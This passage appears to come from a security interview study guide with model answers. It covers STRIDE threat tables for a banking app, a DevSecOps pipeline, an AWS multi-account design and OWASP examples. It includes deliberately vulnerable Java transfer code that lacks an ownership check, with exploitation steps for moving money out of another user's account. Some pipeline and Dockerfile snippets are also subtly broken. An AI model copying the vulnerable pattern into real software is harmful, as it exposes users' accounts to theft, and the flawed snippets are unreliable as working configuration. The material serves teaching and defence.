| Threat # | Threat | CVSS | Impact | Detection | Mitigation |
|----------|--------|------|--------|-----------|------------|
| **R1** | User denies sending transaction (no digital signature proof) | 5.3 | Disputed transactions | ⚠️ Business process issue | Digital signature + transaction receipt |
| **R2** | Attacker erases audit logs on compromised backend | 8.0 | Attack undetectable | ❌ Logs on same server | Immutable append-only audit log (separate system) |
| **R3** | Logs don't include sufficient transaction context | 4.5 | Incomplete forensics | ~ Manual verification | Transaction ID + timestamp + user + action |

**INFORMATION DISCLOSURE (Confidentiality)**

| Threat # | Threat | CVSS | Impact | Detection | Mitigation |
|----------|--------|------|--------|-----------|------------|
| **I1** | Metadata leakage: Message size reveals transaction amount | 6.2 | Pattern-based attacks | ❌ Invisible to tools | Padding to fixed size; randomized message size |
| **I2** | Timing attack: Auth server response time reveals user existence | 5.8 | User enumeration | ⚠️ Requires statistical analysis | Constant-time comparison + random delay |
| **I3** | Error messages expose backend implementation (e.g., "User not in table X") | 5.5 | Information leakage for OSINT | ~ Code review catches | Generic error messages; detailed logs server-side only |
| **I4** | SSL downgrade attack (override certificate pinning via proxy) | 7.5 | Full session exposure | ❌ Not caught without explicit testing | Pinning validation enforced; no bypass via system proxy |
| **I5** | Coarse-grained encryption: Multiple transactions in one message | 6.0 | Partial decryption attack | ⚠️ Cryptographic analysis | Single transaction per encrypted message |
| **I6** | Biometric template exfiltration from device | 7.9 | Biometric spoofing | ❌ Hardware-level threat | Biometric engine isolated from OS; secure enclave |

**DENIAL OF SERVICE (Availability)**

| Threat # | Threat | CVSS | Impact | Detection | Mitigation |
|----------|--------|------|--------|-----------|------------|
| **D1** | Rate limiting bypass (attacker sends 10k requests) | 6.5 | Service unavailable | ~ Load testing detects | Adaptive rate limiting + circuit breaker |
| **D2** | Amplification attack: Small request → Large response | 7.0 | Bandwidth exhaustion | ~ Metrics reveal ratio | Request size limit; response size control |
| **D3** | Cryptographic operation DoS (expensive signing) | 6.2 | Backend exhaustion | ⚠️ Performance testing | Async signing; queue with rate limit |
| **D4** | Billion Laughs (XML bomb via message format) | 6.0 | Parser crash | ~ Only if XML used | Disable XML entity expansion; JSON-only |
| **D5** | Client-side DoS: App crash via crafted message | 5.5 | User experience impact | ❌ Only found via fuzzing | Fuzzing + message validation; defensive parsing |

**ELEVATION OF PRIVILEGE (Authorization)**

| Threat # | Threat | CVSS | Impact | Detection | Mitigation |
|----------|--------|------|--------|-----------|------------|
| **E1** | Token claim forgery (JWT "admin" claim injection) | 8.8 | Full privilege escalation | ~ Code review + JWT validation | JWT signature verification + issuer check |
| **E2** | Secondary account compromise via "remember device" | 7.2 | Bypass MFA | ~ Behavioral analysis | Device binding to biometric; invalidate on unknown location |
| **E3** | Privilege escalation via race condition in permission check | 7.5 | Unauthorized transfers | ⚠️ Concurrency testing detects | Lock-based permission check + database constraints |
| **E4** | Cached authorization decision not invalidated | 6.8 | Stale permissions | ~ Manual trace testing | Real-time permission check on sensitive action |

**4. Risk Prioritization Matrix:**

```
Risk = CVSS × Business Impact × Likelihood

High Priority (Address first):
├─ S4: Compromised device key (8.5) + Account takeover + Common (jailbreak)
│  └─ Likelihood: 3/5 (jailbroken devices exist)
├─ T3: Database tampering (8.9) + Ledger corruption + Medium likelihood (3/5)
├─ E1: JWT claim forgery (8.8) + Privilege escalation + Medium (3/5)
├─ I6: Biometric template theft (7.9) + Spoofing attacks + Medium (3/5)
└─ T2: App binary modification (7.8) + Backdoor persistence + Medium (3/5)

Medium Priority:
├─ I2: Timing attack (5.8) + User enumeration + Complex (requires attacker skill)
├─ S1: Replay attack (6.8) + Duplicate transactions + High (easy to execute)
└─ D1: Rate limiting bypass (6.5) + DoS + Medium

Low Priority:
├─ R1: Non-repudiation (5.3) + Legal dispute + Business decision
└─ I3: Error messages (5.5) + OSINT + Low (information gathering phase)
```

**5. Detailed Mitigations:**

**Threat S4: Compromised Device Key**
```
Problem: If device is jailbroken/rooted, Keystore can be accessed

Mitigation Layers:
┌─ Layer 1: Hardware-Backed Keystore
│  └─ Require Android KeyStore with StrongBox (TEE/SE)
│     if available; fallback to OS KeyStore
│
├─ Layer 2: Key Access Validation
│  └─ Before using key, verify device security:
│     ├─ Check root detection tools
│     ├─ Verify boot partition hash (SafetyNet / Play Integrity API)
│     ├─ Challenge response to prove key still secure
│     └─ On failure: Revoke credential, force re-auth
│
├─ Layer 3: Time-Limited Key Validity
│  └─ Encryption keys valid only 30 minutes
│     After expiry: Re-authenticate via biometric
│     (forces attacker to use key immediately)
│
├─ Layer 4: Alert on Suspicious Key Usage
│  └─ Backend detects multiple transactions in short time
│     → Challenge with fresh biometric + OTP
│
└─ Layer 5: Monitoring & Response
   └─ Track: Jailbroken device attempts
      Action: Disable account, force password reset
```

**Threat I1: Metadata Leakage (Message Size)**
```
Problem: Encrypted message size reveals transaction amount
Example: $1,000 transfer = 1,234 bytes, $50 = 892 bytes

Detection: Attacker observes multiple transfers, clusters by size

Mitigation:
┌─ Padding to fixed size
│  └─ All messages pad to 2048 bytes
│     Overhead: 8x for small transactions (acceptable)
│
├─ Randomized padding
│  └─ Padding length varies (random 1-256 bytes)
│     Attacker sees: 1,234-1,490 bytes (no clear signal)
│
├─ Dummy messages
│  └─ Client sends fake transactions periodically
│     Noise hides real transaction patterns
│     Overhead: 10% more bandwidth
│
└─ Compositional messages
   └─ Bundle multiple operations in one message
      Size doesn't directly correlate to single transaction
      (adds latency/complexity)
```

**Threat R2: Audit Log Tampering**
```
Problem: Backend compromise allows deletion of audit logs

Mitigation: WORM (Write-Once-Read-Many) Logging Architecture

Architecture:
┌─ Application Logs
│  └─ Append to local SQLite (non-persisted)
│
├─ Event Stream (Kafka)
│  └─ All security events streamed to immutable log
│     Multiple subscribers (monitoring, alerting)
│
├─ Immutable Append-Only Log (S3, GCS)
│  └─ S3 with Object Lock (WORM enforcement)
│     ├─ Versioning enabled (can't delete old)
│     ├─ Legal hold (can't delete ever)
│     └─ Retention policy (can't delete for 1 year)
│
├─ Blockchain Ledger (Optional)
│  └─ Hash of each log entry to blockchain
│     If log tampered → blockchain hash mismatch detected
│
└─ Monitoring & Alerting
   └─ Continuous hash verification
      Miss: Send alert + fire incident response
```

**Follow-up Questions:**
1. Which threat would cause the most reputational damage?
2. How do you test these mitigations in a CI/CD pipeline?
3. Describe a scenario where multiple STRIDE threats combine (compound attack).
4. How does your threat model change if the backend is compromised?

**Common Mistakes:**
- ❌ Treating all STRIDE categories equally (different business impact)
- ❌ Only considering direct threats (missing composite attacks)
- ❌ Not including insider threat scenarios
- ❌ Assuming "encrypted" = "secure" (ignores metadata, side-channels)
- ❌ No quantitative risk scoring (decisions based on gut feel)

---

## SECTION 4: DEVSECOPS PIPELINES & CI/CD SECURITY

### Question 4.1: Shift-Left Security Implementation

**Question:**
> Design an end-to-end shift-left security program for a FinTech company deploying 100+ times daily. Include: pre-commit hooks, build-time gates, deployment controls, compliance automation, and container security. Address scaling challenges with 500+ developers and legacy teams resistant to security.

**Ideal Answer Structure:**

**1. Shift-Left Architecture:**

```
Traditional (Reactive):
Dev → Code Review → QA → Production Deploy → [Security Review] → Incident

Shift-Left (Proactive):
[Pre-commit] → [Build Gate] → [Deploy Gate] → [Runtime Security] → [Compliance]
   ↓             ↓              ↓               ↓                  ↓
 30 sec         5 min          15 min         Continuous          Audit

Benefit Matrix:
Phase           | Speed | Cost of Fix | Developer Friction
Pre-commit      | Real-time | $0-100      | Medium (feedback loop)
Build-time      | 5-10 min  | $100-1K     | Low (background)
Deploy-time     | 15-30 min | $1K-10K     | High (blocks release)
Runtime         | Always   | $10K-1M+    | Critical (production incident)
```

**2. Pre-Commit Security Layer:**

```bash
#!/bin/bash
# .git/hooks/pre-commit - Run on developer laptop

TIMEOUT=30  # Fast feedback
FAILED=0

echo "🔍 Running security pre-checks..."

# 1. Secrets Detection (30ms)
detect-secrets scan --baseline .secrets.baseline --no-verify 2>/dev/null
if [ $? -ne 0 ]; then
    echo "❌ FAIL: Secrets detected. Use: detect-secrets scan --update .secrets.baseline"
    FAILED=1
fi

# 2. Dependency Check (500ms)
npm audit --audit-level=moderate --offline 2>/dev/null
if [ $? -ne 0 ]; then
    echo "⚠️  WARN: npm audit found issues. Review with: npm audit fix"
    # Non-blocking for pre-commit (would add too much latency)
fi

# 3. Static Analysis (lightweight, 2s)
# Only checks CHANGED lines (not full codebase)
eslint --cache --fix <STAGED_FILES>
if [ $? -ne 0 ]; then
    echo "❌ FAIL: ESLint violations found"
    FAILED=1
fi

# 4. Code Quality (2s)
stylelint --cache <STAGED_JS_FILES>
if [ $? -ne 0 ]; then
    echo "❌ FAIL: Style violations"
    FAILED=1
fi

# 5. Terraform security check (1s)
tfsec . --minimum-severity HIGH --exit-code 1 2>/dev/null
if [ $? -ne 0 ]; then
    echo "❌ FAIL: Terraform security issues"
    FAILED=1
fi

# 6. Git hook compliance
git config commit.gpgsign true  # Enforce GPG signing
if [ "$(git config --get commit.gpgsign)" != "true" ]; then
    echo "⚠️  WARN: Git signing not enabled"
fi

if [ $FAILED -eq 1 ]; then
    echo ""
    echo "🚫 Pre-commit checks failed. Fix above issues and retry:"
    echo "   git add . && git commit"
    exit 1
fi

echo "✅ All pre-commit checks passed!"
exit 0
```

**Problem: Legacy teams + Resistance**
```
Challenge: "These security checks slow us down!"
           "I'm not changing my workflow!"

Solution: Graduated enforcement

Phase 1 (Week 1-2): Reporting only
├─ Run pre-commit in warning mode
├─ Generate reports but don't block
└─ Developer education + tools intro

Phase 2 (Week 3-4): Soft enforcement
├─ Block only CRITICAL findings (secrets)
├─ Easy bypass for LOW/MEDIUM (--no-verify)
└─ 90% of team trains + adopts

Phase 3 (Week 5+): Full enforcement
├─ All findings blocking
├─ Team trained, comfortable with tools
└─ Bypass audit trail (why did you skip?)
```

**3. Build-Time Security Gates:**

```yaml
# .github/workflows/security-build.yml
name: Security Build Gate

on: [push, pull_request]

jobs:
  Security:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    
    steps:
      # 1. Secrets Detection
      - name: Detect Secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --json --fail
      
      # 2. SAST Analysis (changed files only for speed)
      - name: SAST - SonarQube
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: >
            -Dsonar.sources=src
            -Dsonar.exclusions=**/*.test.ts
            -Dsonar.security.hotspots.review.priority=HIGH
      
      # 3. SCA - Dependency Check
      - name: SCA - npm audit
        run: |
          npm audit --json > audit-report.json
          node -e "
            const audit = require('./audit-report.json');
            const critical = audit.metadata.vulnerabilities.critical;
            if (critical > 0) {
              console.error(\`❌ \${critical} critical vulnerabilities\`);
              process.exit(1);
            }
          "
      
      # 4. SCA - Known CVE in Snyk
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          npm install -g snyk
          snyk test --severity-threshold=high --fail-on=upgradable
      
      # 5. DAST - API Schema Validation
      - name: DAST - Schema Validation
        run: |
          npm run api:validate-schema -- --fail-on-breaking
      
      # 6. IaC Scanning (Terraform/CloudFormation)
      - name: IaC - Terraform Security
        uses: aquasecurity/tfsec-action@master
        with:
          working_directory: './terraform'
          minimum_severity: HIGH
      
      # 7. Container Scanning (if Dockerfile present)
      - name: Container - Build & Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ github.repository }}:${{ github.sha }}
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      # 8. Upload SARIF results for GitHub Security Tab
      - name: Upload Results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
      
      # 9. Enforce Policy (FAIL if key findings)
      - name: Security Policy Enforcement
        run: |
          node scripts/enforce-security-policy.js
        env:
          FAIL_ON_MEDIUM: true
          FAIL_ON_CRITICAL: true
          ALLOWED_EXCEPTIONS: |
            CVE-2024-0001|reason=vendor-patch-in-progress|expires=2024-03-31
            CVE-2024-0002|reason=not-in-execution-path|expires=2024-04-30

  # Parallel: Performance gate (reject if >5% slower)
  Performance:
    runs-on: ubuntu-latest
    steps:
      - name: Benchmark vs. baseline
        run: npm run benchmark
```

**4. Deployment Security Gates:**

```yaml
# Deployment approval workflow
Deploy-Production:
  needs: [Security, Tests, Performance]
  
  Gate 1: Security Findings Review
  └─ If HIGH/CRITICAL findings: Require security team approval
     If MEDIUM: Require team lead approval
     If LOW: Auto-approve if previous review passed

  Gate 2: Container Image Verification
  └─ Verify image signed with KMS key
     Verify artifact attestation (SLSA framework)
     No unsigned images to prod

  Gate 3: Infrastructure Changes
  └─ IaC (Terraform) changes trigger approval workflow
     Compare planned vs. actual infrastructure
     Detect accidental exposure/rule changes

  Gate 4: Secrets Rotation Validation
  └─ Verify secrets not embedded in image
     Image should only contain injection points
     Validate secret paths match policy

  Gate 5: Compliance Checklist
  └─ ☑️  Encryption enabled on data at rest
     ☑️  Encryption in transit (TLS 1.2+)
     ☑️  Audit logging enabled + exported
     ☑️  Rate limiting configured
     ☑️  Authentication/authorization tested
     ☑️  Security headers for web apps

  Gate 6: Rate-Limiting
  └─ Progressive rollout: 5% → 25% → 50% → 100%
     Monitor error rates, latency, security alerts
     Auto-rollback if >5% error rate increase
```

**5. Container Security Integration:**

```dockerfile
# Multi-stage build with security scanning
FROM node:18-alpine AS base
# Scan source dependencies early
RUN npm audit --audit-level=high

FROM base AS builder
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine AS runtime
# Minimal attack surface image
USER nobody
COPY --from=builder /app/node_modules /app/node_modules
COPY --from=builder /app/package.json /app/
COPY app /app

# Security configuration
RUN \
  # Disable shell for defense-in-depth
  echo "nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin" > /etc/passwd && \
  # Remove unnecessary packages
  apk del --no-cache apk-tools && \
  # Set read-only filesystem
  chmod -R a-w /etc

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD wget --quiet --tries=1 --spider http://localhost:3000/health || exit 1

EXPOSE 3000
CMD ["node", "app.js"]

# Scan at build time
# docker build --label com.example.security.scan=trivy .
```

**6. Runtime Security Monitoring:**

```yaml
Runtime Security:

1. Container Runtime Monitoring
   ├─ Detect suspicious syscalls (falco)
   ├─ Monitor file access to secrets directory
   ├─ Alert on unexpected network connections
   └─ Block if high-risk behavior detected (kill container)

2. API Security Monitoring
   ├─ Rate limiting enforcement (DDoS protection)
   ├─ Authentication failure tracking (brute force detection)
   ├─ Anomalous API usage (behavioral analysis)
   └─ Sensitive data exposure (PII in logs/responses)

3. Compliance Monitoring
   ├─ Audit log completeness (every action logged)
   ├─ Data retention policy (delete after 90 days)
   ├─ Access control enforcement (least-privilege audit)
   └─ Encryption verification (random audit of encrypted data)

4. Incident Response Integration
   ├─ Security event → Auto-alert
   ├─ Incident created + assigned
   ├─ Relevant logs bundled with alert
   └─ Autofix attempted (e.g., rate-limit attacker IP)
```

**7. Scaling to 500+ Developers:**

```
Challenge: 500 devs × 50 deploys/day = 25,000 deployments/day
Problem: Security gates can't manually review everything

Solution: Risk-Based Sampling & Automation

┌─ Tiered Risk
│  ├─ Tier 1 (Configuration change): 10% manual review
│  ├─ Tier 2 (New feature): 50% manual review
│  ├─ Tier 3 (Critical path mutation): 100% review
│  └─ Auto escalate if findings = previous issue
│
├─ Topology-Aware Gates
│  ├─ Frontend changes: Lighter security gate
│  ├─ Authentication changes: Stricter gate
│  └─ Database schema: Compliance + security review
│
├─ Automated Remediation
│  ├─ Secrets found → Auto-rotate + alert
│  ├─ Known CVE → Auto-patch if available
│  ├─ Insecure headers → Auto-add to response
│  └─ Track remediations + audit
│
└─ Team-Based Trust Scoring
   ├─ Teams with high security maturity = faster gates
   ├─ Teams with issues = stricter enforcement
   └─ Training reduces friction over time
```

**Follow-up Questions:**
1. How do you balance security gates with developer velocity?
2. What's your most common reason for overriding security gates?
3. Describe a security incident that the shift-left approach prevented.
4. How do you onboard a team that's resistant to security?

**Common Mistakes:**
- ❌ Gates too strict → bypass becomes culture
- ❌ Gates too loose → vulnerabilities slip through
- ❌ No feedback loop (dev doesn't know why finding matters)
- ❌ Assuming all developers have same risk tolerance
- ❌ Not measuring shift-left effectiveness

---

## SECTION 5: CLOUD & INFRASTRUCTURE SECURITY

### Question 5.1: AWS Multi-Account Security Architecture

**Question:**
> Design a multi-account AWS architecture for a financial services company with: Dev/Staging/Prod environments, partner integrations, compliance requirements (PCI-DSS, SOC2), and data residency constraints. Include account structure, IAM strategy, network isolation, monitoring, and compliance automation.

**Ideal Answer Structure:**

**1. Account Organization:**

```
AWS Organization Root
├─ Management Account (Billing, SCPs, Audit)
│  ├─ AWS SSO / Identity Center
│  ├─ CloudTrail (central logging)
│  ├─ Config (compliance)
│  └─ Security Hub (findings aggregation)
│
├─ OU: Core Infrastructure
│  ├─ Logging Account
│  │  └─ CloudTrail S3 bucket, VPC Flow Logs
│  ├─ Networking Account
│  │  └─ VPC, Transit Gateway, DNS (Route53)
│  └─ Security Account
│     └─ GuardDuty, Macie, Security Hub central view
│
├─ OU: Production (Compliance-heavy)
│  ├─ Prod-Finance (PCI-DSS, SOC2)
│  │  ├─ RDS with encryption at rest/transit
│  │  ├─ Isolated subnets + NACLs
│  │  ├─ VPC endpoints (no internet gateway)
│  │  └─ Extensive logging
│  ├─ Prod-API (OAuth2 resource servers)
│  ├─ Prod-Analytics (PII-sensitive data)
│  └─ Prod-Backup (encrypted disaster recovery)
│
├─ OU: Staging (Pre-prod mirror)
│  ├─ Staging-Finance (reduced redundancy)
│  ├─ Staging-API
│  └─ Staging-Analytics
│
├─ OU: Development (Higher risk tolerance)
│  ├─ Dev-Team-A (Developers: prod-like, but writable)
│  ├─ Dev-Team-B
│  └─ Dev-TeamC
│
├─ OU: Partner Integration
│  ├─ Partner-Bank-A (VPC peering, restricted IAM)
│  ├─ Partner-API-Vendor
│  └─ Partner-Vendor-SaaS
│
└─ OU: Sandbox / Security Testing
   └─ Penetration testing, chaos engineering
```

**2. IAM Strategy (Federated, Least Privilege):**

```yaml
# AWS IAM Architecture with SSO

AWS-SSO / Identity-Center:
├─ Primary Identity Provider
│  ├─ On-premises AD / Azure AD sync
│  ├─ MFA enforcement (Duo, Okta, etc.)
│  ├─ Group-based provisioning
│  └─ Device compliance checks
│
├─ Permission Sets (Role templates)
│  ├─ PermissionSet: Developer
│  │  └─ Grants: EC2, ECS, S3 (specific bucket), CloudWatch
│  │     Timebound: 8 hours max session
│  │     MFA required: YES
│  │     Device compliance: YES (not jailbroken)
│  │
│  ├─ PermissionSet: DBA
│  │  └─ Grants: RDS full access (with monitoring)
│  │     Restrictions: Cannot delete snapshots, cannot modify backups
│  │     Timebound: 4 hours max
│  │     Approval: Requires manager sign-off
│  │
│  ├─ PermissionSet: Security-Admin
│  │  └─ Grants: IAM, Security Hub, GuardDuty, Config
│  │     Restrictions: Cannot delete audit trails
│  │     Logging: All actions logged + sent to security team
│  │
│  └─ PermissionSet: Read-Only
│     └─ Grants: All services read-only
│        Expires: On login (session-based)
│
├─ Account-Permission Set Mapping
│  ├─ Finance-Prod:
│  │  └─ Developer @ 2-hour sessions (approval gate)
│  │     DBA @ 1-hour sessions (approval + audit)
│  │     Security-Admin @ unlimited
│  │
│  ├─ Dev-Team-A:
│  │  └─ Developer @ 8-hour sessions (no approval)
│  │     DBA @ 4-hour sessions (approval)
│  │
│  └─ Sandbox:
│     └─ Security-Admin @ 4 hours (testing environment)
│
└─ Session Monitoring & Revocation
   ├─ Active session tracking dashboard
   ├─ Anomaly detection (login from unusual location/time)
   ├─ Auto-revoke if risk detected
   └─ Audit trail of all SSO tokens issued
```

**3. Network Isolation:**

```
VPC Architecture (Finance-Prod):

┌─────────────────────────────────────────────────────┐
│ VPC: 10.0.0.0/16 (Prod-Finance)                     │
│ ├─ Private subnets only (no IGW)                    │
│ ├─ NAT Gateway for outbound traffic                 │
│ └─ VPC Endpoints for AWS services                   │
└─────────────────────────────────────────────────────┘
        │              │              │
    ┌───┴────┐    ┌────┴───┐    ┌────┴────┐
    │ AZ-1   │    │ AZ-2   │    │ AZ-3    │
    └────┬───┘    └───┬────┘    └──┬──────┘
         │            │            │
    ┌────┴──────────────────────────┴──────┐
    │ Subnet: 10.0.1.0/24 (Private)        │
    │ ├─ RDS (MySQL, encrypted)            │
    │ ├─ EC2 (app servers, no IGW)         │
    │ ├─ DynamoDB VPC Endpoint             │
    │ └─ S3 VPC Endpoint                   │
    └────────────────────────────────────┬─┘
                                         │
    ┌────────────────────────────────────┴─┐
    │ Subnet: 10.0.2.0/24 (Cache/Queues)  │
    │ ├─ ElastiCache (Redis, encrypted)    │
    │ ├─ SQS Interface Endpoint             │
    │ └─ SNS Interface Endpoint             │
    └────────────────────────────────────┬─┘
                                         │
    ┌────────────────────────────────────┴─┐
    │ Transit Gateway (cross-account)      │
    │ └─ Route to: Dev, Staging, Partners  │
    └────────────────────────────────────┬─┘
                                         │
    ┌────────────────────────────────────┴─┐
    │ Network Firewall Rules               │
    │ ├─ Deny all inbound (explicit allow) │
    │ ├─ Allow only API Gateway traffic    │
    │ ├─ Allow only SSO/bastion access     │
    │ └─ Log all dropped packets (CloudWatch)
    └────────────────────────────────────────┘

Security Controls:
├─ NACLs (Stateless firewalls)
│  └─ Inbound: Only API Gateway (10.0.100.0/24)
│     Outbound: SQL (3306), DNS (53), NTP (123)
│
├─ Security Groups (Stateful firewalls)
│  ├─ RDS security group: Inbound from app SG only
│  └─ App security group: Inbound from ALB only
│
├─ VPC Flow Logs (all traffic)
│  └─ Reject/Accept logged to CloudWatch + S3
│
└─ GuardDuty + Network Watcher
   └─ Detect C2 communication, port scanning, etc.
```

**4. Encryption & Secrets Management:**

```yaml
Encryption Strategy:

Data at Rest:
├─ RDS (MySQL)
│  ├─ Encrypted with AWS KMS (customer-managed key)
│  ├─ Key rotation: Automatic annual
│  ├─ Backup: Encrypted with same key
│  └─ Replica: Encrypted independently in other region
│
├─ S3 (Data/logs)
│  ├─ Default encryption: AWS KMS (customer-managed)
│  ├─ Versioning: Enabled (track accidental deletion)
│  ├─ Lifecycle: 90 days → Archive, 7 years delete
│  └─ MFA Delete: Enabled (require MFA to delete)
│
├─ EBS Volumes
│  ├─ All volumes encrypted (EBS Encryption = KMS)
│  ├─ AMIs encrypted
│  └─ Snapshots encrypted
│
└─ Secrets Manager
   ├─ RDS DB credentials (auto-rotation quarterly)
   ├─ API keys (rotation policy)
   ├─ Encryption: KMS key per secret
   └─ Audit: All access logged + alerted

Data in Transit:
├─ VPC → AWS Service: VPC Endpoints (no internet)
├─ Client → API: TLS 1.2+ (Mutual TLS for internal)
├─ RDS replication: TLS encrypted
├─ S3 transfer: SSL/TLS + client-side encryption
└─ DynamoDB: Encrypted streams

Key Management:
├─ Customer-Managed KMS Keys
│  ├─ Separate keys for: Prod, Staging, Dev
│  ├─ Key policy: Explicit deny unapproved principals
│  ├─ Rotation: Annual automatic
│  └─ MFA to disable key
│
├─ Hardware Security Module (HSM)
│  └─ Consider for compliance: PCI-DSS level 3
│     (highest assurance key storage)
│
└─ Key Audit
   └─ CloudTrail logs all KMS API calls
      Anomaly: Bulk decryption attempt → Alert
```

**5. Compliance Automation (PCI-DSS + SOC2):**

```python
# AWS Config Rules (Automated Compliance)

import boto3
from aws_cdk import (
    core,
    aws_config as config,
    aws_sns as sns,
    aws_ssm as ssm,
)

class ComplianceAutomation(core.Stack):
    def __init__(self, scope: core.Construct, **kwargs):
        super().__init__(scope, **kwargs)
        
        # PCI-DSS Required: RDS encryption enabled
        self.add_managed_rule(
            rule_id="rds-encryption-enabled",
            config_rule_name="pci-dss-rds-encrypted",
            source_identifier="RDS_STORAGE_ENCRYPTED",
            scope="AWS::RDS::DBInstance",
            config_rule_state="ACTIVE",
        )
        
        # PCI-DSS Required: S3 encryption enabled  
        self.add_managed_rule(
            rule_id="s3-default-encryption-enabled",
            config_rule_name="pci-dss-s3-encrypted",
            source_identifier="S3_DEFAULT_ENCRYPTION_KMS",
            scope="AWS::S3::Bucket",
        )
        
        # SOC2 Required: CloudTrail enabled + S3 MFA Delete
        self.add_managed_rule(
            rule_id="cloudtrail-enabled",
            config_rule_name="soc2-cloudtrail-enabled",
            source_identifier="CLOUD_TRAIL_ENABLED",
        )
        
        # SOC2 Required: VPC Flow Logs enabled
        self.add_managed_rule(
            rule_id="vpc-flow-logs-enabled",
            config_rule_name="soc2-vpc-flow-logs",
            source_identifier="VPC_FLOW_LOGS_ENABLED",
        )
        
        # PCI-DSS Required: Restrict Security Group rules
        self.add_custom_rule(
            rule_name="pci-dss-sg-no-unrestricted-access",
            description="Security groups must not allow 0.0.0.0/0 ingress",
            lambda_arn=self.create_lambda_for_sg_check(),
            trigger_on="ConfigurationItemChangeNotification",
            scope="AWS::EC2::SecurityGroup",
        )
        
        # Automated Remediation
        self.add_remediation_config(
            rule_name="rds-encryption-enabled",
            target_type="SSM_DOCUMENT",
            automatic=True,
            max_automatic_attempts=5,
            retry_attempt_seconds=30,
            target_version="1",
        )
    
    def add_managed_rule(self, **kwargs):
        """Add AWS Config managed rule"""
        pass
    
    def add_custom_rule(self, **kwargs):
        """Add custom Python rule"""
        pass
    
    def create_lambda_for_sg_check(self):
        """Lambda to detect overly permissive security groups"""
        return """
        import json
        import boto3
        
        config_client = boto3.client('config')
        
        def lambda_handler(event, context):
            config_item = json.loads(event['configurationItem'])
            
            if config_item['resourceType'] != 'AWS::EC2::SecurityGroup':
                return {'compliance_type': 'NOT_APPLICABLE'}
            
            # Check for unrestricted ingress (0.0.0.0/0, ::/0)
            ingress_rules = config_item['configuration'].get('ipPermissions', [])
            
            bad_rules = []
            for rule in ingress_rules:
                ip_ranges = rule.get('ipRanges', [])
                for ip_range in ip_ranges:
                    if ip_range.get('cidrIp') in ['0.0.0.0/0']:
                        bad_rules.append(rule)
            
            if bad_rules:
                return {
                    'compliance_type': 'NON_COMPLIANT',
                    'remediation_available': True
                }
            
            return {'compliance_type': 'COMPLIANT'}
        """

# Compliance Reporting
class ComplianceReporting:
    def generate_compliance_dashboard(self):
        """Real-time dashboard showing: PCI-DSS compliance %, SOC2 % """
        return {
            "pci_dss": {
                "total_rules": 45,
                "compliant": 44,
                "non_compliant": 1,
                "compliance_percentage": 97.8,
                "failing_rules": [
                    "rds-encryption-enabled (Finance-Prod DB)"
                ]
            },
            "soc2": {
                "total_rules": 32,
                "compliant": 32,
                "non_compliant": 0,
                "compliance_percentage": 100
            }
        }
```

**6. Incident Response & Monitoring:**

```yaml
Security Monitoring Stack:

AWS Security Hub (Central findings aggregation):
├─ GuardDuty: Threat detection
├─ Macie: Data discovery & classification
├─ Inspector: Vulnerability scanning
├─ Config: Compliance tracking
└─ Partner integrations: Third-party findings

Alert Flow:
Event → CloudWatch Logs → Lambda → SNS → Security Team
  ↓
  Automatic Investigation
  ├─ Pull relevant CloudTrail logs
  ├─ Check GuardDuty severity
  ├─ Correlate with other events
  └─ Create incident ticket
  
Priority Escalation:
├─ CRITICAL: Alert security team + auto-page
├─ HIGH: Alert team, create Jira ticket
├─ MEDIUM: Auto-create ticket, daily review
└─ LOW: Weekly summary report
```

**Follow-up Questions:**
1. Design a disaster recovery failover across regions while maintaining PCI-DSS.
2. How do you prevent a compromised dev account from pivoting to prod?
3. Describe a complex scenario (e.g., partner API access during security incident).
4. How do you audit that compliance automation actually works (meta-audit)?

---

## SECTION 6: SECURE CODING & OWASP TOP 10

### Question 6.1: OWASP Top 10 Deep Dive with Real Code Examples

**Question:**
> For each OWASP Top 10 (2021), provide: vulnerable code, exploitation technique, detection method (SAST/DAST/manual), and remediation. Focus on real-world fintech scenarios where logic matters more than the code.

**Ideal Answer:**

---

## A01:2021 – Broken Access Control

**Vulnerable Code (Java JWT-based API):**
```java
@RestController
@RequestMapping("/api/transfer")
public class TransferController {
    
    @PostMapping("/{accountId}/send")
    public ResponseEntity<TransferResponse> transfer(
        @PathVariable Long accountId,
        @RequestBody TransferRequest req,
        @AuthenticationPrincipal UserPrincipal principal
    ) {
        // VULNERABILITY: Only checks if user is authenticated, not if they own the account
        
        // In theory: Should verify principal.userId owns the accountId
        // In practice: Attacker can change accountId to victim's account
        
        Account account = accountRepository.findById(accountId)
            .orElseThrow(() -> new AccountNotFoundException());
        
        // No authorization check here!
        // Attacker: GET /api/transfer/100/send (account 100 is victim's)
        
        account.balance -= req.amount;
        account.save();
        
        return ResponseEntity.ok(new TransferResponse("SUCCESS"));
    }
}

// Exploitation:
// 1. Attacker authenticates as themselves
// 2. Intercept request: POST /api/transfer/999/send (999 = victim's account)
// 3. Server doesn't verify attacker owns account 999
// 4. Transaction succeeds → attacker drains victim
```

**SAST Detection:**
```
SonarQube Rule: "Verify authorization before sensitive operation"
└─ Pattern: @PostMapping + @PathVariable + database.save()
   without permission check
└─ Confidence: Medium (requires data flow analysis)
```

**DAST Detection:**
```
Test Plan:
1. Authenticate as User A (accountId: 100)
2. Intercept request to /api/transfer/100/send
3. Modify request to /api/transfer/999/send (User B's account)
4. If request succeeds → VULNERABILITY
```

**Remediation - Secure Code:**
```java
@PostMapping("/{accountId}/send")
public ResponseEntity<TransferResponse> transfer(
    @PathVariable Long accountId,
    @RequestBody TransferRequest req,
    @AuthenticationPrincipal UserPrincipal principal
) {
    // FIXED: Explicitly verify authorization
    
    Account account = accountRepository.findById(accountId)
        .orElseThrow(() -> new AccountNotFoundException());
    
    // Step 1: Check ownership
    if (!account.ownerId.equals(principal.userId)) {
        throw new ForbiddenException("Not authorized to access account " + accountId);
    }
    
    // Step 2: Check additional business rules
    if (principal.transferLimit < req.amount) {
